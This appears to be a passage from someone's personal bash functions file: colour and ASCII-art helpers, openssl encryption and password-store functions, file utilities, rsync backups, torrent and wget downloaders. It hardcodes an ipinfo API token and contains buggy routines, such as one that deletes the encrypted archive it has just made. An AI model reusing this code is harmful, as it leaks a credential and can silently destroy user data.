	: '
	while getopts ":u:p:f:e:gclih" opt; do
	  case "$opt" in
		h) help ;;
		u) export addr=${OPTARG};;
		p) export port=${OPTARG};;
		f) export file=${OPTARG};;
		e) export exploit=${OPTARG};;
		g) run;;
		c) create;;
		l) list;;
		i) interactive;;
	  esac
	done
	#shift $(( OPTIND - 1 ))
	'
	while getopts ":p:u:f:e:cri:" opt; do
	  case "$opt" in
		p) port=${OPTARG}; export port=${OPTARG};echo $port;;
		u) addr=${OPTARG}; export addr=${OPTARG};echo $addr;;
		f) file=${OPTARG}; export file=${OPTARG};echo $file;;
		e) exploit=${OPTARG}; export exploit=${OPTARG};echo $exploit;;	
		c) create ;;
		r) run ;;
		i) interactive ;;
		esac
	done
	shift $(( OPTIND - 1 ))
}
getgeo(){
	curl ipinfo.io/$1?token=b3fd452e4ce396
	#curl ipinfo.io/$1?token=b3fd452e4ce396
	#curl http://api.db-ip.com/v2/free/$1
}
# Get my IP
function myip {
	#loading
	curl -H "Authorization: Bearer $b3fd452e4ce396" ipinfo.io
	#curl https://json.geoiplookup.io/
	#curl ipinfo.io/?token=b3fd452e4ce396
	#curl -u $b3fd452e4ce396: ipinfo.io
    #curl -H "Authorization: Bearer $b3fd452e4ce396" ipinfo.io
    #curl ipinfo.io?token=$b3fd452e4ce396
	#curl -s https://4.ifcfg.me; echo
	#curl -s http://whatismyip.akamai.com; echo
	#curl ifconfig.me; echo
	#curl -s icanhazip.com; echo
}
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
#┏━┓┏━┓┳  ┏━┓┳━┓┓━┓  ┏┓   ┓━┓┳ ┳o┏┓┓
#┃  ┃ ┃┃  ┃ ┃┃┳┛┗━┓  ┃━╋  ┗━┓┃━┫┃ ┃ 
#┗━┛┛━┛┇━┛┛━┛┇┗┛━━┛  ┇━┛  ━━┛┇ ┻┇ ┇ 
# Shows shell color code
#==>Colors an shit
color() {
	for clbg in {40..47} {100..107} 49 ; do
		#Foreground
		for clfg in {30..37} {90..97} 39 ; do
			#Formatting
			for attr in 0 1 2 4 5 7 ; do
				#Print the result
				echo -en "\e[${attr};${clbg};${clfg}m ^[${attr};${clbg};${clfg}m \e[0m"
			done
			echo #Newline
		done
	done
	for fgbg in 38 48 ; do # Foreground / Background
		for color in {0..255} ; do # Colors
			# Display the color
			printf "\e[${fgbg};5;%sm  %3s  \e[0m" $color $color
			# Display 6 colors per lines
			if [ $((($color + 1) % 6)) == 4 ] ; then
				echo # New line
			fi
		done
		echo # New line
	done
	for i in 00{2..8} {0{3,4,9},10}{0..7}
	do echo -e "\e[0;${i}m\\\e[0;${i}m\e[00m  \e[1;${i}m\\\e[1;${i}m\e[00m"
	done

	for i in 00{2..8} {0{3,4,9},10}{0..7}
	do for j in 0 1
	   do echo -e "\e[$j;${i}m\\\e[$j;${i}m\e[00m"
	   done
	done
}
clearscreen() { 
	echo -e '\033[2J\033[u' 
}
rcolors() {
	for i in {30..49};do echo -e "\033[$i;7mReversed color code $i\e[0m self.Taught()";done
}
cecho(){
    RED="\033[0;31m"
    GREEN="\033[0;32m"
    YELLOW="\033[1;33m"
    # ... ADD MORE COLORS
    NC="\033[0m" # No Color

    printf "${!1}${2} ${NC}\n"
}
colorgrid()
	{
		python2 $HOME/scripts/.pycolorsrc.py
	}
# 'ls' using the 256 color
function ls-color {
	for line in $(ls -a);# --human-readable --size -1 -S --classify);
	do printf "\033[38;5;%dm%s\033[0m\n" $(($RANDOM%255)) "$line";
	sleep 0.2;
	done
}
: ' REQUIRES "toilet" '
# Have a given word displayed by all toilet fonts
function toiletf
	{
		file="$HOME/scripts/Linux_More/toilet_fonts.txg"
		#file="$HOME/scripts/Linux_More/figfonts.txt"
		while IFS= read -r line
		do
			echo -e "$line"
			toilet -F metal -f  "$line" $1 $2 $3 $4 $5 $6 
			sleep 0.1
		done < "$file"
	}

# Enough said !
arch()
	{
echo -e "                                        \e[34m+\e[0m"
echo -e "                                        \e[34m#\e[0m"
echo -e "                                       \e[34m###\e[0m"
echo -e "                                      \e[34m#####\e[0m"
echo -e "                                      \e[34m######\e[0m"
echo -e "                                     \e[34m; #####;\e[0m"
echo -e "                                    \e[34m+##.#####\e[0m"
echo -e "                                   \e[34m+##########\e[0m"
echo -e "                                  \e[34m#############;\e[0m"
echo -e "                                 \e[34m###############+\e[0m"
echo -e "                                \e[34m#######   #######\e[0m"
echo -e "                              \e[34m.######;     ;###;''.\e[0m"
echo -e "                             \e[34m.#######;     ;#####.\e[0m"
echo -e "                             \e[34m#########.   .########'\e[0m"
echo -e "                            \e[34m######'           '######\e[0m"
echo -e "                           \e[34m;####                 ####;\e[0m"
echo -e "                           \e[34m##'                     '##\e[0m"
echo -e "                          \e[34m#'                         '#\e[0m"
}
function rogg {	#_09/21/21

echo -e "                                           ${ORANGE}xKKKKKKXKXXXNNNN.  "                
echo -e "                                        ${ORANGE}.KKK00KKXXNNWX           "             
echo -e "                                      ${ORANGE}0K000KXWWWN           ${GRAY}0NXXXN "           
echo -e "                                   ${ORANGE}oKK0KKNWWo         ${GRAY}o0000KKX:  "               
echo -e "       k.                       ${ORANGE};KK0KXNWc       ${GRAY}.000O0KX'   KWX "                
echo -e "       :No                   ${ORANGE}.KKKKXW0      ${GRAY}.NXK0KKX   .XK0O0X0 "                 
echo -e "        XNN   ${ORANGE};x          ${ORANGE}.KKKKXW.     ${GRAY}NNKK0KX   ,KKOOOOO0XWo "                 
echo -e "        .WWW;  ${ORANGE}dXNN    ${ORANGE}.KKKXNO    ${GRAY}cNXK0KX.  .KKKKKKd XKXNWW' "                
echo -e "           0WX  ${ORANGE}0XNNNXKKXN'   ${GRAY}xNXK0Kk   NNXK.      ,NXXWWK  "                
echo -e "              :c ${ORANGE}NNNNNW.  ${GRAY}xNX0KXc  oN             OK0KWW, "                
echo -e "                  ${ORANGE}XWWc:${GRAY}WNK00O                   x000XWx  "                
echo -e "                   ${ORANGE}kWN    ${GRAY}cWWWNNNNN.         :0000XW0 "                
echo -e "                    ${ORANGE} KW.        ${GRAY}dNNXXXXXKKK00OOKNWo "                 
echo -e "                       ${ORANGE};d              ${GRAY} .NNNNNW; "          
}

function scroll {	#7/1/21
	python3 <<EFO
import sys
import time
import os
width = 60
mess = '$1'
os.system('clear')
def animate():
    try:
        while True:
            for x in range(width, -5):
                time.sleep(0.3)
                msg = "\r{}{}".format(" " * x, mess)
                sys.stdout.write(msg)
                sys.stdout.flush()

            for x in range(-5, width):
                time.sleep(0.1)
                msg = "\r{}{}".format(" " * x, mess)
                sys.stdout.write(msg)
                sys.stdout.flush()
 
    except KeyboardInterrupt:
        print("Exiting")
animate()
EFO
}
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
#┳━┓┏┓┓┏━┓┏━┓┳━┓o┏┓┓┏━┓  ┏┓   ┳━┓┏┓┓┏━┓┳━┓┓ ┳┳━┓┏┓┓o┏━┓┏┓┓
#┣━ ┃┃┃┃  ┃ ┃┃ ┃┃┃┃┃┃ ┳  ┃━╋  ┣━ ┃┃┃┃  ┃┳┛┗┏┛┃━┛ ┃ ┃┃ ┃┃┃┃
#┻━┛┇┗┛┗━┛┛━┛┇━┛┇┇┗┛┇━┛  ┇━┛  ┻━┛┇┗┛┗━┛┇┗┛ ┇ ┇   ┇ ┇┛━┛┇┗┛
#==>Encode
passcompress() {
	echo -e "Encrypt/Decrypt(e/d)"
	read -p ">_ " answer
	if [ $answer = 'd' ]; then
		ls -ltra
		read -p ">_ " dir
		openssl enc -aes-256-cbc -d -in $dir | tar xz
		rm -rf $dir.tar.gz.enc
	elif [ $answer = 'e' ]; then
		ls -ltra
		read -p ">_ " dir
		tar cz $dir | openssl enc -aes-256-cbc -e > $dir.tar.gz.enc
		rm -rf $dir.tar.gz.enc
	fi
}
# Encrypt a file
encrypt() {
	read -p "List files/directories ? " show
	if [ $show = 'y' ]; then
		ls -la
		read -p "File/Directory to encrypt: " object1
		read -p "Name encrypted object: " object2
		openssl enc -aes-256-cbc -in $object1 -out $object2.enc
	elif [ $show = 'n' ]; then 
		read -p "File/Directory to encrypt: " object3
		read -p "Name encrypted object: " object4
		openssl enc -aes-256-cbc -in $object3 -out $object4.enc
	else
		echo -e "Invalid option. [y/n]"
		encrypt
	fi
}
# Decrypt a file
decrypt() {
	read -p "List files/directories ? " show
	if [ $show = 'y' ]; then
		ls -la
		read -p "File/Directory to decrypt: " object1
		read -p "Name decrypted object: " object2
		openssl enc -d -aes-256-cbc -in $object1 -out $object2
	elif [ $show = 'n' ]; then 
		read -p "File/Directory to decrypt: " object3
		read -p "Name decrypted object: " object4
		openssl enc -d -aes-256-cbc -in $object3 -out $object4
	else
		echo -e "Invalid option. [y/n]"
		decrypt
	fi
}	
# hash a string
mkhash() {
	echo -e "Enter word to hash"
	read -p ">_ " word
	echo -e "md5sum(m), sha512sum(s), base64(b), or all(a)"
	read -p ">_ " choice
	if [ $choice = 'm' ]; then
		echo -n $word | md5sum
	elif [ $choice = 's' ]; then
		echo -n $word | sha512sum
	elif [ $choice = 'b' ]; then
		echo $word | base64
	elif [ $choice = 'a' ]; then
		echo -e "md5sum"
		echo $word | md5sum
		echo -e "sha512sum"
		echo $word | sha512sum
		echo -e "Base64"
		echo $word | base64
	fi 
}

# Generate Password
function passgen {
	echo -e "Hex(h) or Base64(b) ?"
	read -p ">⎽ " type
	echo -e "Length ?"
	read -p ">⎽ " len
	if [ $type = 'h' ]; then
		echo -e "Write to a file ?"
		read -p ">⎽ " fileyesno
		if [ $fileyesno = 'y' ]; then
			echo -e "Name of file. Make it hidden: .your_file.txt"
			read -p ">⎽ " filename
			openssl rand -hex $len > $filename
			echo -e "Create another ?" 
			read -p ">⎽ " answer
			if [ $answer = 'y' ]; then
			passgen
			fi
		elif [ $fileyesno = 'n' ]; then
			openssl rand -hex $len
			echo -e "Create another ?" 
			read -p ">⎽ " answer
			if [ $answer = 'y' ]; then
			passgen
			fi
		fi
	elif [ $type = 'b' ]; then
		echo -e "Write to a file ?"
		read -p ">⎽ " fileyesno
		if [ $fileyesno = 'y' ]; then
			echo -e "Name of file. Make it hidden: .your_file.txt"
			read -p ">⎽ " filename
			openssl rand -base64 $len > $filename
			echo -e "Create another ?" 
			read -p ">⎽ " answer
			if [ $answer = 'y' ]; then
			passgen
			fi
		elif [ $fileyesno = 'n' ]; then
			openssl rand -base64 $len
			echo -e "Create another ?" 
			read -p ">⎽ " answer
			if [ $answer = 'y' ]; then
			passgen
			fi
		fi
	fi
}
#Password db
function passdb {
	echo -e "Read(r) file or add(a) to file ? "
	read -p ">_ " choice
	if [ $choice = 'r' ]; then
		openssl enc -d -aes-256-cbc -in $HOME/.trash/.shit.db.enc -out $HOME/.trash/.shit.db
		cat $HOME/.trash/.shit.db
		openssl enc -aes-256-cbc -in $HOME/.trash/.shit.db -out $HOME/.trash/.shit.db.enc
		rm $HOME/.trash/.shit.db
	elif [ $choice = 'a' ]; then
		openssl enc -d -aes-256-cbc -in $HOME/.trash/.shit.db.enc -out $HOME/.trash/.shit.db
		echo "Enter any notes"
		read -p "_> " notes
		echo "Enter site/account"
		read -p "_> " account
		echo "Enter the username"
		read -p "_> " username
		stty -echo
		read -p "Enter password: " password
		stty echo
		echo
		echo "$(date)" >> $HOME/.trash/.shit.db
		echo "$notes" >> $HOME/.trash/.shit.db
		echo "$account" >> $HOME/.trash/.shit.db
		echo "$username" >> $HOME/.trash/.shit.db
		echo "$password" >> $HOME/.trash/.shit.db
		echo "_.::._" >> $HOME/.trash/.shit.db
		openssl enc -aes-256-cbc -in $HOME/.trash/.shit.db -out $HOME/.trash/.shit.db.enc
		rm $HOME/.trash/.shit.db
	fi
}
hiddenpass() {
	prompt="Enter Password:"
	while IFS= read -p "$prompt" -r -s -n 1 char
	do
		if [[ $char == $'\0' ]]
		then
			break
		fi
		prompt='*'
		pass+="$char"
	done
	echo
	echo $pass 
}
decode() {
	if [[ "$1" = "-b" ]] || [[ "$1" = "--base64" ]]; then
		echo $2 | base64 -d;echo
	elif [[ "$1" = "-r" ]] || [[ "$1" = "--rot13" ]]; then
		python3 <<EOF 
import codecs; 
print(codecs.decode('$2','rot-13')) 
EOF
	elif [[ "$1" = "-bin" ]] || [[ "$1" = "--binary" ]]; then
		echo "$2" | perl -lape '$_=pack"(B8)*",@F'
	elif [[ "$1" = "-m" ]] || [[ "$1" = "--md5sum" ]]; then
		echo $2 | md5sum; echo
	elif [[ $1 = '-h' ]] || [[ $1 = '--hex' ]]; then
		echo $2 | $HOME/scripts/xxd -r -p
	else
		echo -e "Usage: decode [-b/--base64 | -bin/--binary | -m/--md5sum | -r/--rot13 | -h/--hex]"
	fi
}
encode() {
	if [[ "$1" = "-b" ]] || [[ "$1" = "--base64" ]]; then
		echo "$2" | base64
	elif [[ "$1" = "-m" ]] || [[ "$1" = "--md5sum" ]]; then
		echo "$2" | md5sum
	elif [[ "$1" = "-bin" ]] || [[ "$1" = "--binary" ]]; then
		echo "$2" | perl -lpe '$_=join " ", unpack"(B8)*"'
	elif [[ $1 = '-h' ]] || [[ $1 = '--hex' ]]; then
		echo $2 | $HOME/scripts/hex
	elif [[ "$1" = "-r" ]] || [[ "$1" = "--rot13" ]]; then
		python3 <<EOF 
import codecs; 
print(codecs.decode('$2','rot-13')) 
EOF
	else
		echo -e "Usage: encode [-b/--base64 | -bin/--binary | -m/--md5sum | -r/--rot13 | -h/--hex]"
	fi
}
urlencode() {
    # urlencode <string>

    old_lc_collate=$LC_COLLATE
    LC_COLLATE=C

    local length="${#1}"
    for (( i = 0; i < length; i++ )); do
        local c="${1:$i:1}"
        case $c in
            [a-zA-Z0-9.~_-]) printf '%s' "$c";;
            *) printf '%%%02X' "'$c";;
        esac
    done

    LC_COLLATE=$old_lc_collate
}
function urldecode() { : "${*//+/ }"; echo -e "${_//%/\\x}"; }

: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
function extract {
 if [ -z "$1" ]; then
    # display usage if no parameters given
    echo "Usage: extract <path/file_name>.<zip|rar|bz2|gz|tar|tbz2|tgz|Z|7z|xz|ex|tar.bz2|tar.gz|tar.xz>"
    echo "       extract <path/file_name_1.ext> [path/file_name_2.ext] [path/file_name_3.ext]"
    return 1
 else
    for n in $@
    do
      if [ -f "$n" ] ; then
          case "${n%,}" in
            *.tar.bz2|*.tar.gz|*.tar.xz|*.tbz2|*.tgz|*.txz|*.tar)
                         tar xvf "$n"       ;;
            *.lzma)      unlzma ./"$n"      ;;
            *.bz2)       bunzip2 ./"$n"     ;;
            *.rar)       unrar x -ad ./"$n" ;;
            *.gz)        gunzip ./"$n"      ;;
            *.zip)       unzip ./"$n"       ;;
            *.z)         uncompress ./"$n"  ;;
            *.7z)        7z x ./"$n"        ;;
            *.xz)        unxz ./"$n"        ;;
            *.exe)       cabextract ./"$n"  ;;
            *)
                         echo "extract: '$n' - unknown archive method"
                         return 1
                         ;;
          esac
      else
          echo "'$n' - file does not exist"
          return 1
      fi
    done
fi
}


function compress {
	tar -cvpzf $1.tar.gz $1
}
rmcmt() {	# 06/1521
	sed -i 's/#//' ${@:1}
}

function resize {	# 06/19
	if [ -f /bin/convert ]; then
		#file us_nice.png  | awk '{print $5$6$7}' | cut -d ',' -f1
		#meta vishal.jpg | grep 'Image Size' | awk '{print $4}'
		echo -e $GRAY"Enter file name$ORANGE: "
		cho -e $BLUE"┌──["$RED"convert"$WHITE"@"$RED"Windows98"$BLUE"]"
		read -p "└──╼ " file
		file $file
		echo -e $GRAY"Enter in this order"$ORANGE": "$CYAN"current size"$ORANGE", "$CYAN"new size "$RED"&& "$CYAN"new name "$GREEN"Hint"$WHITE"{"$ORANGE"300"$GRAY"x"$ORANGE"300"$GREEN"}"
		echo -e $BLUE"┌──["$RED"convert"$WHITE"@"$RED"Windows98"$BLUE"]"
		read -p "└──╼ " current new name
		convert -size $current $file -resize $new $name
	fi
}
function dirinfo {	#6/25
	/home/wax/scripts/directory.sh
}
function xspace {
	for f in * ; 
	do
		echo $f
		mv "$f" $( echo $f | tr ' ' '_' ) ; 
	done
	# for i in $(ls); do 
}
# Creates a copyable space
space()
	{
		echo -e "'‍  ‍  ‍'"
	}
function spacee {
for f in *
do
  new="${f// /_}"
  if [ "$new" != "$f" ]
  then
    if [ -e "$new" ]
    then
      echo not renaming \""$f"\" because \""$new"\" already exists
    else
      echo moving "$f" to "$new"
    mv "$f" "$new"
  fi
fi
done
}
convert_pic() {
	echo -e "Enter the formats as (E.g *.png)"
	echo -e "Format to covert"
	read -p ">_ " cv
	echo -e "Format to convert to"
	read -p ">_ " cvto
	for pic in $cv; do
		cp "$pic" "${pic%.$cv}.$cvto"
		if [ -e "${pic%.$cv}.$cvto" ]; then
			rm -f "$pic"
		fi
	done
}
ht2php()
	{
	for file in */*.html; do
		cp "$file" "${file%.html}.php"
		if [ -e "${file%.html}.php" ]; then
			rm -f "$file"
		fi
	done
}
mkv2mp4()
	{
	for video in *.mkv; do
		#ffmpeg -i "$video" -c copy "${video%.mkv}.mp4"
		#ffmpeg -i my_"$video" -vcodec copy -acodec copy my "${video%.mkv}.mp4"
		ffmpeg -hide_banner -i "$video" -c:v libx264 -c:a copy "New_${video%.mkv}.mp4"
		if [ -e "${video%.mkv}.mp4" ]; then
			rm -f "$video"
		fi
	done
	}
: ' Make this like the above conversion '
avi2mp4()
	{
	for video in *.avi; do
		ffmpeg -i "$video" -c copy "${video%.avi}.mp4"
		ffmpeg -i my_"$video" -c:a aac -b:a 128k -c:v libx264 -crf 23 my "${video%.avi}.mp4"
		if [ -e "${video%.mkv}.mp4" ]; then
			rm -f $video
		fi
	done
}
function mvext {	# 06/24/21 {1:39am}
	read -p 'File type:╼ ' ftype
	read -p 'New type:╼ ' ntype
	for f in *.$ftype; do 
		mv -v -- "$f" "${f%.$ftype}.$ntype"
	done
	#for f in *.txt; do mv -- "$f" "${f%.txt}.text"; done
	#!/bin/bash
	for f in *.$1
	do
		[ -f "$f" ] && mv -v "$f" "${f%$1}$2"
	done
}
# Print N most recently modified files in current dir or below
mrf() {
	if [[ $1 = "home" ]]; then
		echo -e "Most recent documents in $HOME"
		loading
		find $HOME -type f -mmin -1440 -exec stat -c $'%Y\t%n' {} + | sort -nr | cut -f2- | more
	elif [[ $1 = "home_bk" ]]; then
		echo -e "Most recent documents in $INBACKUPDIR"
		loading
		find $INBACKUPDIR -type f -mmin -1440 -exec stat -c $'%Y\t%n' {} + | sort -nr | cut -f2- | more
	elif [[ $1 = "custom" ]]; then
		echo -e "Directory to search:"
		read -p ">_ " dir 
		echo -e "Most recent documents in $dir"
		loading
		find $dir -type f -mmin -1440 -exec stat -c $'%Y\t%n' {} + | sort -nr | cut -f2- | more
	elif [[ $1 -eq 0 ]]; then
		ls -1t | head -n 10
		find $1 -type f -mmin -1440 -exec stat -c $'%Y\t%n' {} + | sort -nr | cut -f2- | more
	fi
}
#Lists how many files are in the PWD
function files { 

    N="$(ls $1 | wc -l)"; 
    echo "$N files in $PWD";
}

: '###### ▼ KINDA THE SAME ! ▼ ######'
#Search for a specific word in a file in the $PWD
function srch() {
	grep -Rn $1 $2 | grep -v "\.svn" | grep -v "\.log"
}
# Find the line number that contains a specific string in a file:
function find_line_number {
	echo -e "The string '$1' is on the following lines in the file $2"
	grep --color=always -n $1 $2
}
: '###### ▲ KINDA THE SAME ! ▲ ######'

# Count how many lines in a file
function lines {
	echo -e "Enter 'file' - 'path/to/file'"
	read length
	wc -l $length
}
# Find empty lines and the number of the empty line
function empty_lines() {
    echo -e "The following lines are empty in "$1":\n\
$(sed -n '/^$/=' "$1" | tr '\n' ' ')"
}
# Delete all empty lines from a file
function delete_empty_lines {
	sed -i '/^$/d' $1
}
# Delete lines in a file
function delete_lines {
	echo -e "Delete lines containing a string(s) or line numbers(n) ?"
	read -p ">⎽ " answer
	if [ $answer = 's' ]; then
		echo -e "Enter the string. $RED$BLINK[!]$RESET$BOLD$RED WARNING:$WHITE ALL lines containing
		the string will be deleted $RED$BLINK[!]$RESET$BOLD$LIGHT_GREEN"
		read -p ">⎽ " string 
		sed -i "/\b$string\b/d" $1
	elif [ $answer = 'n' ]; then
		echo -e "Enter line number. If multiple lines, seperate with commas(1,5)"
		read -p ">⎽ " line
		sed -i $line'd' $1
	fi
}
# Insert string to a certain line of a file
function insert_line {
	echo -e "Enter the string to insert"
	read -p ">⎽ " string
	echo -e "Enter the line number to insert $string on"
	read -p ">⎽ " number
	sed -i $number'i'"$string" $1
}	
function srch_string {
	ls -lskhCF --color --human-readable --size -1 -S --classify
	read -p "Which directory ? " dir
	read -p "String: " string 
	if [ $dir !> 0 ]; then
		dir=$PWD
	fi
	grep --color=always -rnw $dir -e "$string"
}
function replaceR {
	echo -e "::[X]:: Warning: This will recursively replace strings ! ::[X]::"
	sleep 2
	read -p "Word to replace: " word1
	read -p "Word to replace with: " word2
	egrep -lRZ '$word1' . | xargs -0 -l sed -i -e 's/$word1/$word2/g'
}
function dirsync {
	#rsync --progress -avu $1 $2
	rsync -avu --exclude {'$HOME/.cache'} $HOME/ /run/media/wax/ROG/
}

# Use rsync to backup just 1 directory
backup() {
	echo -e $BLINK$RED"Don't use '/' at the end of the paths $RESET$BOLD$ORANGE"
	echo -e "Source Path:"
	read -p ">_ " sourcepath
	echo -e "Destination Path:"
	read -p ">_ " destpath
	sudo rsync -ahvXS --info=progress2 --out-format="%t %f %''b" $sourcepath/ $destpath/
}
# Use rsync to sync home directory to home_bk then to external
function home {
	echo -e "Make sure external and internal HDD are mounted {!}" 
	if [ -d /run/media/wax/storage/ ]; then
		loading
		echo -e "$INBACKUPDIR mounted" 
		echo -e "PRESS ENTER TO CONTINUE"
		read -n 1
		if [ -d /run/media/wax/storage ]; then
			echo -e "$EXBACKUPDIR mounted" 
			echo -e "PRESS ENTER TO CONTINUE" 
			read -n 1
			echo -e $RED"{!} Starting in 3 seconds . . . {!}" 
			loading
			#bleachbit -c --preset
			sudo rsync -ahvXS --info=progress2 --out-format="%t %f %''b" $HOME/ /run/media/wax/storage/
			loading
			sudo rsync -ahvXS --info=progress2 --out-format="%t %f %''b" /run/media/wax/storage/ /run/media/wax/storage
			echo -e "Completed" 
		fi
	fi
}
function picshare {
	if [ -d /run/media/wax/storage/Shared_Pics ]; then
		echo -e "Updating Picture Database for shared viewing"
		loading
		sudo rsync -ahvXS --info=progress2 --out-format="%t %f %''b" $HOME/Pictures /run/media/wax/storage/Shared_Pics/
	fi
}
function docshare {
	if [ -d /run/media/wax/storage/Shared_Docs ]; then
		echo -e "Updating Shared Documents for shared viewing" 
		loading
		sudo rsync -ahvXS --info=progress2 --out-format="%t %f %''b" $HOME/Documents /run/media/wax/storage/Shared_Docs
	fi
}	
function scriptshare { 
	if [ -d /run/media/wax/storage/Shared_Scripts ]; then
		echo -e "Updating Shared Scripts for shared viewing"
		loading
		sudo rsync -ahvXS --info=progress2 --out-format="%t %f %''b" $HOME/scripts /run/media/wax/127.0.0.1Shared_Docs
	fi
}
function musicshare { 
	if [ -d /run/media/wax/storage/Shared_Scripts ]; then
		echo -e "Updating Shared Scripts for shared viewing"
		loading
		sudo rsync -ahvXS --info=progress2 --out-format="%t %f %''b" $HOME/Music /run/media/wax/127.0.0.1Shared_Music
	fi
}
showhidden() {
	#find $PWD -name ".*" -type d | cut -d'/' -f4
	ls -d .*/
}
function totaluse { 	# 06/10/21
	df -lP |awk '{sum += $3} END {printf "%d GiB\n", sum/2**20}'
}
rmesc() { # 5/18/21
	sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" $1  >> $2 
}
mkdesktop() {		# 05/25/21
	echo -e "Finish this*** Not working !"
	dir1='/home/wax/.local/share/applications/'
	cat $dir1/vokoscreen.desktop
	read -p 'Name & path of app to create .desktop for: ' newEntry
	echo -e {$dir1}
}
capitals() { # 06/16/21
	if [ $1 = '-l' ]; then
		echo ${@:2} | tr [:upper:] [:lower:]
	elif [ $1 = '-u' ]; then
		echo ${@:2} | tr [:lower:] [:upper:]
	fi
}
count() { # 6/2/21
	if [[ $1 = '-r' ]]; then
		find . -type f | wc -l
	elif [[ $1 = '-d' ]]; then
		ls | wc -l
	fi
}
function gs {	# 11/6/21
    du -sh * | grep "[0-9].[0-9]M\|[0-9].[0-9]G"
}
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'	
#==>Etc
function cool {
	for i in {1..50}; do echo "$i: $((RANDOM%30))";done | gnuplot -e "set terminal dumb $COLUMNS $LINES; plot '-' with lines"
}
termgif() {
	if [[ -f /usr/bin/asciinema ]]; then
	export gifname=$2
		if [[ $1 = '--start' ]] || [[ $1 = '-s' ]]; then
			echo "='┌──[яøøԵ@Windows98]─[\w]\n└──╼ \$ '"
			read -p 'Press any key to continue'
			echo -e "Recording GIF. Type 'exit' to stop"
			asciinema rec $gifname.cast;
			echo -e "Convert GiF now ?"
			read -p  ">_ " answer
			if [[ $answer = 'y' ]] || [[ $answer = 'yes' ]]; then
				sudo systemctl restart docker;
				docker run --rm -v $PWD:/data asciinema/asciicast2gif $gifname.cast $gifname.gif
			fi
		elif [[ $1 = '--render' ]] || [[ $1 = '-r' ]]; then
			echo -e "*.cast name ?"
			read -p ">_ " name
			docker run --rm -v $PWD:/data asciinema/asciicast2gif $name.cast $name.gif
		elif [[ $1 = '--speed' ]] || [[ $1 = '-f' ]]; then
			read -p 'Enter name: >_ ' name
			convert -delay 
		elif [[ $1 = '--help' ]] || [[ $1 = '-h' ]]; then
		echo -e "
#Use asciinema and asciicast2gif to make gifs of terminal
!asciinema rec hello-world.cast
!docker run --rm -v $PWD:/data asciinema/asciicast2gif hello-world.cast hello-world.gif
#Now, if you want to slow it down to half speed, you’ll need to set a delay of 10 hundredths of a second.
!convert -delay 10x100 your.gif your_slow.gif
#You could also write convert -delay 10 your.gif your_slow.gif since the default unit is hundredths of a second.
#To speed it up, you just have to set a shorter delay, for instance:
!convert -delay 1x30 your.gif your_quick.gif
#1x30 is ImageMagick’s notation for 1 times 1/30th of a second.
#This works well
!convert -delay 2.5x30 test.gif test_quick.gif
# This will optimize and reduce to 256 colors, if the animation uses more colors
# Colors: 16 - 32 - 64 - 128 - 256
!gifsicle -i anim.gif -O3 --colors 256 -o anim-opt.gif
!gifsicle -O3 --colors 256 --lossy=30 -o output.gif input.gif
			"
		fi
	fi
}
: '
	echo -e "GIF Name"
	read -p ">_ " gif
	for picpng in *.png; do
		cp "$picpng" "${picpng%.png}.jpg"
		if [ -e "${picpng%.png}.jpg" ]; then
			rm -f "$picpng"
		fi
	done
	for picpng in *.jpeg; do
		cp "$picpng" "${picpng%.jpeg}.jpg"
		if [ -e "${picpng%.jpeg}.jpg" ]; then
			rm -f "$picpng"
		fi
	done
	convert -delay 100 -loop 0 *.jpg $gif.gif
'	
# Play Video in terminal
termvid() {
	if [ -f /usr/bin/mplayer ]; then 
		echo -e "Listing "
		loading
		if [ $INBACKUPDIR ]; then
			find $INBACKUPDIR -name "*mp4" 
			find $INBACKUPDIR -name "*mkv" 
			read -p "Video $SEPERATOR " video 
			mplayer -really-quiet -vo caca $video 
		fi
	fi
}
torrent() {
	torrents=$(find $HOME -name "*.torrent" -print 2>/dev/null | sed 's|.*/||' )
	PS3="::> "
	select torrentf in $torrents
	do
		torrent_clean=$(echo $torrentf | cut -d. -f1)
		echo "${BLUE}Download: ${WHITE}${torrent_clean} ?"
		read  answer
		if [[ $answer = 'y' ]] || [[ $answer = 'yes' ]]; then
			tmpfile=$(mktemp)
			chmod a+x $tmpfile
			echo "killall transmission-cli && rm -rf /home/wax/.config/transmission/torrents/*" > $tmpfile
			transmission-cli --download-dir=/home/wax/Torrent/Download -f $tmpfile $torrentf
			read "${BLUE}Delete: ${RED}${torrent_clean} ${BLUE}?" answer2
			if [[ $answer2 = 'y' ]] || [[ $answer2 = 'yes' ]]; then
				rm $torrentf
			else
				echo -e "${RED}Quitting"
			fi
		else
			echo -e "${RED}Quitting"
		fi
		break
	done
: '
	if [ -d /home/wax/Torrent/Download ]; then
		find $HOME -name "*.torrent"
		read  "Copy/Paste Chosen Torrent File: " torrentfile
		for torrentf in $torrentfile
		do 
			tmpfile=$(mktemp)
			chmod a+x $tmpfile
			echo "killall transmission-cli && rm -rf /home/wax/.config/transmission/torrents/*" > $tmpfile
			transmission-cli --download-dir=/home/wax/Torrent/Download -f $tmpfile $torrentf
			rm $torrentf
		done
	else
		echo -e "{!} Not mounted {!}"
		set -e
	fi
'
}

dlallpics() {
	wget -U "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0" -nd -r --level=1  -e robots=off -A jpg,jpeg,png -H $1
}
dldir() {
	wget -r -np -nH --cut-dirs=3 -R index.html $1
}
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'	

# Examples:
#     ix hello.txt              # paste file (name/ext will be set).
#     echo Hello world. | ix    # read from STDIN (won't set name/ext).
#     ix -n 1 self_destruct.txt # paste will be deleted after one read.
#     ix -i ID hello.txt        # replace ID, if you have permission.
#     ix -d ID

ix() {
    local opts
    local OPTIND
